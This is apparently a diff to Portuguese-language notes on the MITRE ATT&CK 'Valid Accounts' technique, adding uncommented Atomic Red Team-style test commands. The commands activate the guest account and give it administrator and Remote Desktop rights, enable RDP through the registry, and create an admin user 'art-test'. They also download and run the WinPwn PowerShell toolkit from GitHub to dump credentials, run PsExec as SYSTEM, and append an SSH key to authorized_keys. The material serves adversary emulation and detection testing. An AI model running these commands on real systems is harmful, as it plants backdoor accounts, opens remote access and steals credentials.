@@ -110,3 +110,30 @@ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 ---
 
 O uso de contas válidas oferece aos adversários um dos meios mais furtivos para manter acesso, movimentar-se lateralmente e executar ações sem levantar alertas imediatos.
+
+
+
+net user #{guest_user} /active:yes
+net user #{guest_user} #{guest_password}
+net localgroup #{local_admin_group} #{guest_user} /add
+net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+
+
+net user #{guest_user} /active:no
+
+
+net user art-test /add
+net user art-test #{password}
+net localgroup administrators art-test /add
+
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+obfuskittiedump -consoleoutput -noninteractive
+
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+safedump -consoleoutput -noninteractive
+
+PsExec.exe" -accepteula -s %COMSPEC% /c whoami
+
+
